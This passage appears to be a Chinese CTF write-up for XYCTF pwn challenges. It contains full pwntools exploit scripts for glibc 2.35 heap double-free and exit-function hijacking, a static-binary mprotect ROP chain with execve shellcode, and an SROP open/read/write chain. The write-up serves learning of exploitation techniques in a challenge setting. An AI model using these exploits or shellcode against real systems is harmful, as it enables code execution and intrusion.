add(7,0x430,b"aaaaaaaa"*2+p64(fakechunk["prev_size"])+p64(fakechunk["size"])+p64(fakechunk["chunk_list_size"])+p64(fakechunk["isUsed"])+p64(fakechunk["buff"])+p64(0)+p64(0x20))
print("成功构造fake chunk \ndouble free 的chunk指针:",hex(fakechunk["buff"]))

# 构造两个fastbin的情况
for i in range(8,12):
    add(i,0x18,b"a")
add(12,0x48,b"a")
for i in range(8,13):
    delete(i)
# fastbin:0x1603d20 —▸ 0x1603d00 heapbase:0x1603000 所以构造一个0x1603d00被free的情况
# 然后glibc 2.35版本下有fd加密 需要:堆地址>>12然后 ^我想要构造的fd
print("构造成功两个fastbin的情况")
delete(4)
for i in range(8,12):
    add(i,0x18,p64(base_heap>>12^0x404070))
add(13,0x38,b"a")
res = gift()

base_libc = int(res[-15:-1],16) -0x80E50
system_addr = base_libc +0x50D70
print("base_libc:",hex(base_libc))
print("system_addr:",hex(system_addr))
add(14,0x18,b"/bin/sh\x00".ljust(8,b"\x00")+p64(0)+p64(system_addr))
gift()
ia()
```

## ptmalloc2 it's myheap pro (glibc2.35下的exit函数打法)

### 审题

- add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc

  ![image-20240418005442527](https://awaqwqa.github.io/img/xyctf/image-20240418005442527.png)

- delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空

  ![image-20240418005502800](https://awaqwqa.github.io/img/xyctf/image-20240418005502800.png)

- view函数 直接write出size大小的内容 存在泄露

  ![image-20240418005523801](https://awaqwqa.github.io/img/xyctf/image-20240418005523801.png)

- atexit函数

  ![image-20240418131700409](https://awaqwqa.github.io/img/xyctf/image-20240418131700409.png)

### 大致利用原理:

> 这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调

- 泄露libc heap地址

  - 通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址

- 伪造fake chunk（消耗topchunk触发fastbin的合并）

  > 或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin

  - 因为题目中存在isUsed 有了这个就阻止了我们`double free`所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free

- 劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表

  > 大概思路:[exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/243196)
  >
  > [[原创\] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-280518.htm#msg_header_h2_1)
  >
  > 这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式

#### 泄露libc heap

> 最简单的一步

简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址

```python
for i in range(9):
    add(i,128,b"a"*0x18)
for i in range(9):
    delete(i)
# 泄露出chunk
add(0,0x68,b"a"*8)
res = view(0)
base_heap = u64(res[2*8:3*8]) -1936
base_libc = u64(res[5*8:6*8]) -2206944
```

- chunk进入unsortedbin 

  ![image-20240418132947766](https://awaqwqa.github.io/img/xyctf/image-20240418132947766.png)

- free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可

  ![image-20240418133015055](https://awaqwqa.github.io/img/xyctf/image-20240418133015055.png)

- 申请回来

  ![image-20240418133239908](https://awaqwqa.github.io/img/xyctf/image-20240418133239908.png)

- 然后write直接泄露即可

#### 伪造fake chunk

> 最消耗时间的一步

- 这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为`头chunk `记录`内容chunk`的size isUsed point 
- `point`指向的就是`内容chunk`

为了绕过isUsed的检测 我们可以利用`delete`后没有清空的特性将原本的`头chunk`覆盖掉 这样就能随意控制`isUsed`和`point`了 实现任意free 所以我们选择触发`fastbin的合并` 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制`内容chunk`刚好为原本某一个的`头chunk`

##### 示意图

![image-20240418134333731](https://awaqwqa.github.io/img/xyctf/image-20240418134333731.png)

- 这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了

#### fastbin合并机制

- 范围:2.35

  - 我们可以通过申请large bin chunk 来触发合并
  - 我们可以通过让topchunk消耗完毕 然后触发合并

- 由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk

  > Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式

- 连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并 

  ```python
  # tcache 0x20 0x90均存满
  # 剩下0xf3c7d0
  for i in range(760):
      add(14,128,b"a"*0x18)
  
  for i in range(6):
      add(i,0x18,b"a"*0x8)
  # 防止fastbin合并后直接被topchunk合并 
  add(7,8,b"a"*8)
  for i in range(6):
      delete(i)
  add(14,128,b"a"*8)
  add(14,0x30,b"a"*8)
  ```

- 合并之前

  ![image-20240418151026231](https://awaqwqa.github.io/img/xyctf/image-20240418151026231.png)

- 合并后

  ![image-20240418151102406](https://awaqwqa.github.io/img/xyctf/image-20240418151102406.png)

#### 构造fakecchunk

```python
fakechunk = {}
fakechunk["size"] = p64(0x21)
fakechunk["prev_size"] = p64(0)
fakechunk["chunk_list_size"] = p64(0x100)
fakechunk["isUsed"] = p64(1)
// 为触发泄露tls+0x30的double free的fastbinchunk地址
fakechunk["buff"] = p64(fd)
# 已经完成覆写 free index5则可实现任意free
add(14,0x58,b"a"*16+fakechunk["prev_size"]+fakechunk["size"]+fakechunk["chunk_list_size"]+fakechunk["isUsed"]+fakechunk["buff"])
```

- 此时index为5 就是我们劫持的`头chunk` 这里的fd就是我们后面要free的任意chunk

  ![image-20240418151731938](https://awaqwqa.github.io/img/xyctf/image-20240418151731938.png)

#### 泄露tls+0x30

> 由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域

- 难点

  - 我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大
  - 实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc
  - glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap>>12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差

```python
# 构造一个double free
for i in range(6,11):
    add(i,0x18,b"a"*16)
# 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除
add(14,0x68,p64(0)+p64(0x100)+p64((xor-0x21)^(tls+0x30)))
for i in range(6,11):
    delete(i)
delete(5)
for i in range(7):
    add(i,0x48,b"a"*8)
add(7,0x48,p64((xor)^(tls)))
for i in range(2):
    add(i,0x48,b"a"*8)
add(0,0x48,b"\x00")
# 泄露tls中信息
res = view(0)
```

- 首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）

  ```python
  if (__builtin_expect(old == p, 0))
  	malloc_printerr("double free or corruption (fasttop)");
  p->fd = PROTECT_PTR(&p->fd, old);
  *fb = p;
  ```

![image-20240420123457567](https://awaqwqa.github.io/img/xyctf/image-20240420123457567.png)

- 然后将利用开始构造好的fakechunk进行free

  ```python
  delete(5)
  ```

  ![image-20240420123602766](https://awaqwqa.github.io/img/xyctf/image-20240420123602766.png)

##### fd加密机制

> glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可

- fd需要是heap基地址^目标地址

#### 劫持exit_funcs链表

> 最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写
>
> 本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来

- 难点
  - 因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了

```python
# size: 0x20c30
for i in range(758):
    add(14,128,b"a"*8)
for i in range(11):
    add(i,0x18,b"a"*8)
add_with_no_chunk(14)
for i in range(11):
    delete(i)
# 将topchunk消耗空触发合并
add(14,0x68,b"a"*8)

# 指定free index 6 可以实现任意free
# free_chunk就是后续构造double free的chunk地址
free_chunk = base_heap+271376+0x10
add(14,128,b"a"*8*4+p64(0)+p64(0x31)+p64(0x100)+p64(1)+p64(free_chunk))
# 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数
for i in range(6):
    add(i,0x68,b"/bin/sh\x00")
for i in range(7,13):
    add(i,0x68,b"/bin/sh\x00")
for i in range(6):
    delete(i)
for i in range(7,13):
    delete(i)
# 触发double free
delete(6)
for i in range(7):
    add(i,0x68,b"a"*8)
# 将fd指向exit_function地址处
add(i,0x68,p64((xor+0x21)^exit_function))
add(0,0x68,b"a"*8)
add(0,0x68,b"/bin/sh\x00")
res = getData(res)
# 获取key的值
res = res[6]
# 计算出key加密后的地址
manba = remove_high_digits(rol(0x401700^res),16)
addr = remove_high_digits(rol(system_addr^res),16)
print("key:",hex(res))
print("libc_base",hex(base_libc))
print("heap_base",hex(base_heap))
print("system_addr",hex(system_addr))
print("exit_function:",hex(exit_function))
print("addr",hex(addr))

add(0,0x68,p64(4)+p64(addr)+p64(base_heap+0x42420))
ru(b">>> ")
sl(b"5")
print("key:",hex(res))
print("libc_base",hex(base_libc))
print("heap_base",hex(base_heap))
print("system_addr",hex(system_addr))
print("exit_function:",hex(exit_function))
print("addr",hex(addr))
ia()

```

## ptmalloc2 it's myheap plus（orw+exit）

> 相对于ptmp只是多了一个sandbox限制 就和Arahat0师傅文章中的流程一模一样 多了一个orw的利用 大致原理都是相同的
>
> 值得一提的是本地通了但是远程打了好久没通后面发现远程不让我以rw的方式打开flag 而是只允许我以r方式打开 

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


# file_name = "./vuln"
url = "127.0.0.1"
port = 49979

# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b *main+34")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debug():
    gdb.attach(p,"b *main+34")
    input("输入请继续")
def add_with_no_chunk(index):
    ru(b">>> ")
    sl(b"1")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    ru(b"[?] Enter chunk size: ")
    sl(b"-1")
    return rl()
def add(index,size,content):
    ru(b">>> ")
    sl(b"1")
    ru(b"[?] please input chunk_idx: ")
    sl(str(index).encode())
    ru(b"[?] Enter chunk size: ")
    sl(str(size).encode())
    ru(b"[?] Enter chunk data: ")
    sd(content)
    print(f"----------\n添加index为:{index}的chunk\n----------")
def delete(index):
    ru(b">>> ")
    sl(b"2")
    ru(b"[?] Enter chunk id: ")
    sl(str(index).encode())
    print(f"----------\n删除index为{index}的chunk\n----------")
def view(index):
    ru(b">>> ")
    sl(b"3")
    ru(b"[?] Enter chunk id: ")
    sl(str(index).encode())
    res = rc(0x68)
    return res
def gift():
    ru(b">>> ")
    sl(b"114514")
    return (ru(b"\n"))
def getData(bytes):
    data = []
    for i in  range(int(len(bytes)/8)):
        try:
            data.append(u64(bytes[i*8:(i+1)*8]))
        except:
            print("非预期数据")
    return data
def rol(value):
    # 模拟 64 位无符号整数
    mask = 0xFFFFFFFFFFFFFFFF
    return ((value << 0x11) | (value >> (64 - 0x11))) & mask
def remove_high_digits(hex_num, desired_length):
    hex_str = hex(hex_num)[2:]  # 将十六进制数字转换为字符串，并去掉开头的"0x"
    if len(hex_str) <= desired_length:
        return int(hex_str,16)  # 如果字符串长度小于等于所需长度，直接返回
    else:
        return int(hex_str[-desired_length:],16)  # 否则，返回去掉最高位后的字符串
# 泄露出chunk
for i in range(7):
    add(i,128,b"a"*8)
for i in range(7,10):
    add(i,128,b"a"*8)
for i in range(9):
    delete(i)

for i in range(7):
    add(i,128,b"\x00")
add(7,128,b"\x00")
res = view(7)
# data = view(5)
base_libc = u64(res[8:16]) - 2207216
print("base_libc",hex(base_libc))
delete(9)
delete(10)
# 泄露heap
for i in range(7):
    add(i,128,b"a"*8)
add(7,128,b"a"*8)
add(8,0x38,b"a"*8)
add(9,128,b"a"*8)
add(10,0x38,b"a"*8)
for i in range(7):
    delete(i)
delete(7)
delete(8)
delete(9)
# print("base_libc",hex(base_libc))
for i in range(7):
    add(i,128,b"\x00")

# debug()
#  0x5633731e9da0
add(7,0x58,b"\x00")
res = view(7)
base_heap = u64(res[8:16])-7856

for i in range(719):
    add(15,128,b"a"*8)
#0x3b0
for i in range(12):
    add(i,0x68,b"a"*8)
for i in range(11):
    delete(i)
add(14,0x38,b"\x00")
add(14,128,b"\x00")
fd = 0x100
add(14,0x58,(b"a"*(0x40-0x10))+p64(0)+p64(0x91)+p64(0x100)+p64(1)+p64(base_heap+0xb20+0x10))
# index:10
# 构造fastbin
for i in range(9):
    add(i,0x68,b"a"*8)
for i in range(9):
    delete(i)
# 0x5600edb1db20-0x5600edb1d000
delete(10)
for i in range(7):
    add(14,0x68,b"/bin/sh\x00")

tls = base_libc -10432
xor = ((base_heap)>>12)
add(14,0x68,p64(tls^xor))
add(14,0x68,p64(tls^xor))
add(14,0x68,p64(tls^xor))
add(14,0x68,p64(base_libc-0x28c0)+p64(base_libc-0x1ea0))
res = view(14)
# 0x7fe867b61160
data = getData(res)
# print(data)
for i in data:
    print(hex(i))
canary = data[5]
key = data[6]


for i in range(759):
    add(14,128,b"/bin/sh\x00")
for i in range(13):
    add(i,0x48,b"/bin/sh\x00")
for i in range(13):
    delete(i)
add(14,128,b"a"*8)
add(14,0x58,b"a"*8)
# fd
add(14,128,p64(0)+p64(0x100)+p64(0x100)+p64(1)+p64(base_heap+0x42050+0x10))
# index 8
for i in range(8):
    add(i,0x78,b"/bin/sh\x00")
for i in range(9,13):
    add(i,0x78,b"/bin/sh\x00")
for i in range(8):
    delete(i)
for i in range(9,12):
    delete(i)
delete(8)
write = p64(base_libc+0x114870)
open64 = p64(base_libc+0x1144E0  )
read = p64(base_libc+0x1147D0)
pop_rdi = p64(base_libc+0x2a3e5)
pop_rsi = p64(base_libc+0x2be51)
pop_rdx_r12 = p64(base_libc+0x11f2e7)
pop_rsp = p64(base_libc+0x35732)
leave = base_libc+0x133BEA
flag = base_heap+0x1398
r_s = base_heap+0x1390
buff = base_heap+0xf40
sendline = base_libc+0x119170
addr = rol(leave^key)
pop_rcx =base_libc +0x3d1ee
for i in range(4):
    add(i,0x78,b"r\x00".ljust(8,b"\x00")+b"./flag\x00".ljust(8,b"\x00"))
add(4,0x78,b"\x00"*0x60)
add(5,0x78,b"a")
add(6,0x78,pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x40)+p64(0)+write)
tls_dtor_list = tls-88
add(7,0x78,p64((xor+0x42)^(tls_dtor_list-8)))
add(14,0x78,b"\x00")
add(14,0x78,b"\x00")
add(14,0x78,p64(0)+p64(base_heap+0x42260))
# add(14,128,p64(addr)+pop_rdi+p64(1)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+write)
add(14,128,p64(addr)+pop_rdi+p64(flag)+pop_rsi+p64(0)+open64+pop_rdi+p64(3)+pop_rsi+p64(buff)+pop_rdx_r12+p64(0x30)+p64(0)+read+pop_rsp+p64(base_heap+0xba0))
print("tls_dtor_list",hex(tls_dtor_list))
print("canary",hex(canary))
print("key",hex(key))
print("base_heap",hex(base_heap))
print("base_libc",hex(base_libc))
print("addr",hex(addr))
print("leave:",hex(leave))
# debug()
# 0x556f210bd050-0x556f2107b000
# print("canary",hex(canary))
# print("key",hex(key))
# print("base_heap",hex(base_heap))
# print("base_libc",hex(base_libc))
# debug()
ru(b">>> ")
sl(b"4")
ia()

```

## static_link

> 静态链接 我们直接通过mprotect函数  开一块内存出来执行shellcode即可

```python

import time
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = "xyctf.top"
port = 33168

elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b main")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
pop_rdi = p64(0x401f1f)
pop_rsi = p64(0x409f8e)
pop_rdx = p64(0x451322)
ret = p64(0x40101a)
read = p64(0x447580 )
mprotect = p64(0x4482C0)
ru(b"static_link? ret2??\n")
bss_addr = 0x4C8000
payload = b"a"*0x28+pop_rdi+p64(bss_addr)+pop_rsi+p64(4096)+pop_rdx+p64(7)+mprotect+pop_rdi+p64(0)+pop_rsi+p64(bss_addr)+pop_rdx+p64(50)+read+p64(bss_addr)
sd(payload)
time.sleep(20)
shellcode =b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
sd(shellcode)
ia()
```

## simple_srop

> srop+orw 注意一下每个指令之间执行的间距就可以了

```python
from pwn import *
import time
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['byobu', 'sp', '-h']


file_name = "./vuln"
url = "127.0.0.1"
port = 53647


# elf = ELF(file_name)
# p= process(file_name)
# p = gdb.debug(file_name,"b main")
p = remote(url,port)

sd = lambda s : p.send(s)
sl = lambda s : p.sendline(s)
sa = lambda n,s : p.sendafter(n,s)
sla = lambda n,s : p.sendlineafter(n,s)
rc = lambda n : p.recv(n)
rl = lambda  : p.recvline()
ru = lambda s : p.recvuntil(s)
ra = lambda : p.recvall()
ia = lambda : p.interactive()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
bss = 0x404060+0x100
bss_addr = p64(bss)
ret_addr = p64(0x40101a)
sigreturn_syscall = p64(0x401296)
syscall = 0x40129D
#调用read在bss段部署payload
sigFrame=SigreturnFrame()
sigFrame.rax=0
sigFrame.rdi=0
sigFrame.rsi=bss
sigFrame.rdx=0x700
# 加0x8是因为这个位置放./flag字符串
sigFrame.rsp = bss+0x8
sigFrame.rip=syscall
payload = b"a"*0x28 + sigreturn_syscall + bytes(sigFrame)

print("bss段:",hex(bss))
sd(payload)
# 第二次构造 orw
sigFrame2=SigreturnFrame()
sigFrame2.rax=2
# ./flag
sigFrame2.rdi=bss
sigFrame2.rsi=0
sigFrame2.rdx=0
# 264是调试出来的
sigFrame2.rsp = bss+0x108
sigFrame2.rip=syscall

# read函数
sigFrame3=SigreturnFrame()
sigFrame3.rax=0
sigFrame3.rdi=3
# 随便写的位置
sigFrame3.rsi=bss+0x400
sigFrame3.rdx=0x36
sigFrame3.rsp = bss+520
sigFrame3.rip=syscall

# write函数
sigFrame4=SigreturnFrame()
sigFrame4.rax=1
sigFrame4.rdi=1
# flag位置
sigFrame4.rsi=bss+0x400
sigFrame4.rdx=0x36
sigFrame4.rsp = bss+520
sigFrame4.rip=syscall
payload =b"./flag\x00".ljust(8,b"\x00")+ sigreturn_syscall + bytes(sigFrame2) +sigreturn_syscall+bytes(sigFrame3)+sigreturn_syscall+bytes(sigFrame4)
print("open+read的长度:",len(payload))
input("第二次输入")
sd(payload)
time.sleep(10)
ia()

```

